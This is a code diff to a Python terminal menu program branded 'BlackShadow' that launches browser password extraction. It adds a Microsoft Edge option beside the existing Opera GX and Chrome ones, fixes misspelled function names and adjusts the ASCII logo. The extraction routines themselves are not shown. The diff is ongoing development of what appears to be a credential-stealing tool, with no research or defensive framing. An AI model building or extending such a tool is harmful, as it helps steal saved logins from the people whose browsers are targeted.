@@ -21,20 +21,21 @@ for package in requiredPackages:
         installPackage(package)
 '''
 import curses
-from browsers.operaGX import getPasswords as getPaswwordsOperaGX
-from browsers.chrome import getPasswords as getPaswwordsChrome
+from browsers.operaGX import getPasswords as getPasswordsOperaGX
+from browsers.chrome import getPasswords as getPasswordsChrome
+from browsers.edge import getPasswords as getPasswordsEdge
 
 os.system('cls' if os.name == 'nt' else 'clear')
 
 def showLogo(screen):
     logo = """
-    ⠀⠀⠀⢀⣴⣿⣿⣿⣦
-   ⠀⠀⠀⣰⣿⡟⢻⣿⡟⢻⣧        ____  __           __   _____ __              __              
-  ⠀⠀⠀⣰⣿⣿⣇⣸⣿⣇⣸⣿       / __ )/ /___ ______/ /__/ ___// /_  ____ _____/ /___ _      __
-   ⠀⣴⣿⣿⣿⣿⠟⢻⣿⣿⣿      / __  / / __ `/ ___/ //_/\__ \/ __ \/ __ `/ __  / __ \ | /| / /
-  ⣠⣾⣿⣿⣿⣿⣿⣤⣼⣿⣿⡇     / /_/ / / /_/ / /__/ ,<  ___/ / / / / /_/ / /_/ / /_/ / |/ |/ / 
-  ⢿⡿⢿⣿⣿⣿⣿⣿⣿⣿⡿⠀    /_____/_/\__,_/\___/_/|_|/____/_/ /_/\__,_/\__,_/\____/|__/|__/  
-  ⠀⠀⠀⠈⠿⠿⠋⠙⠿⠛⠁
+     ⠀⠀⠀⢀⣴⣿⣿⣿⣦
+     ⠀⠀⣰⣿⡟⢻⣿⡟⢻⣧        ____  __           __   _____ __              __              
+    ⠀⠀⣰⣿⣿⣇⣸⣿⣇⣸⣿       / __ )/ /___ ______/ /__/ ___// /_  ____ _____/ /_____      __
+    ⠀⣴⣿⣿⣿⣿⠟⢻⣿⣿⣿      / __  / / __ `/ ___/ //_/\__ \/ __ \/ __ `/ __  / __ \ | /| / /
+   ⣠⣾⣿⣿⣿⣿⣿⣤⣼⣿⣿⡇     / /_/ / / /_/ / /__/ , < ___/ / / / / /_/ / /_/ / /_/ / |/ |/ / 
+   ⢿⡿⢿⣿⣿⣿⣿⣿⣿⣿⡿⠀    /_____/_/\__,_/\___/_/|_|/____/_/ /_/\__,_/\__,_/\____/|__/|__/  
+   ⠀⠀⠀⠈⠿⠿⠋⠙⠿⠛⠁
     """
     screen.addstr(logo)
     screen.refresh()
@@ -77,7 +78,7 @@ def mainMenuControl():
     def menuLogic(screen):
         nonlocal selectedOption, currentOption
         while selectedOption is None:
-            displayMenu(screen, options, currentOption, "BLACKSHADOW MENU")
+            displayMenu(screen, options, currentOption, "MENU")
             key = screen.getch()
             selectedOption, currentOption = handleInput(key, currentOption, options)
 
@@ -87,6 +88,7 @@ def submenuBrowsers():
     options = [
         ("1", "Opera GX"),
         ("2", "Google Chrome"),
+        ("3", "Microsoft Edge"),
         ("0", "Back")
     ]
     currentOption = 0
@@ -106,9 +108,11 @@ def main():
     if choice == '1':
         subchoice = submenuBrowsers()
         if subchoice == '1':
-            getPaswwordsOperaGX()
+            getPasswordsOperaGX()
         elif subchoice == '2':
-            getPaswwordsChrome()
+            getPasswordsChrome()
+        elif subchoice == '3':
+            getPasswordsEdge()
         elif subchoice == '0':
             main()
     elif choice == '0':
